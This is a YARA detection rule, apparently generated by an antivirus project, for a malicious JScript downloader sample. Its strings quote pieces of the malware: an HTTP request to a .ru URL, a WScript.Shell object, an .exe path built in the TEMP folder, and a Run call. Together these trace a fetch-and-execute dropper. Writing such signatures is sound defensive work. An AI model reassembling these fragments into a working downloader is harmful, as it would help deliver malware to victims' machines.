rule sig_20160330_4f33ed9edfbb9b11577a71c9e1e93a44 {
  meta:
    description = "datamaliciousorder - file 20160330_4f33ed9edfbb9b11577a71c9e1e93a44.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6d0be1f21e718a3f8e01c636355dfd0e102e42de2af973bd9f1f58d65cc8be9f"

  strings:
    $s1  = "K0[H](\"GET\", \"http://brand-obuv.ru/m3isud\", false);" fullword ascii
    $s2  = "var A2 = function A() {return WScript[AN](\"WScript\"+\".Shell\");}(), H0 = 11;" fullword ascii
    $s3  = "function C(EF, K1){RU = RU * 1; return EF - K1;};" fullword ascii
    $s4  = "if (K0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EZ() {return A2[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zbvm4kuJB.ex\" + \"e\";};" fullword ascii
    $s6  = "function V(){return XX + \"\";};" fullword ascii
    $s7  = "function ZS(QP){A2[\"Run\"](QP, RU, RU);};" fullword ascii
    $s8  = "function K() {return ((X == true) && (X == FZ)) ? 1 : RU;};" fullword ascii
    $s9  = "var W = new this[\"Date\"]();" fullword ascii
    $s10 = "return C(S, A1);" fullword ascii
    $s11 = "}while (AM);" fullword ascii
    $s12 = "function UF()" fullword ascii
    $s13 = "function VK(ZH) {var KJ = (1, 2, 3, 4, 5, ZH); return KJ;};" fullword ascii
    $s14 = "function XH(){return 22;};" fullword ascii
    $s15 = "function GY(){return AN;};" fullword ascii
    $s16 = "var FZ = false;" fullword ascii
    $s17 = "var FT = false;" fullword ascii
    $s18 = "FZ = true; " fullword ascii
    $s19 = "} catch(D){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}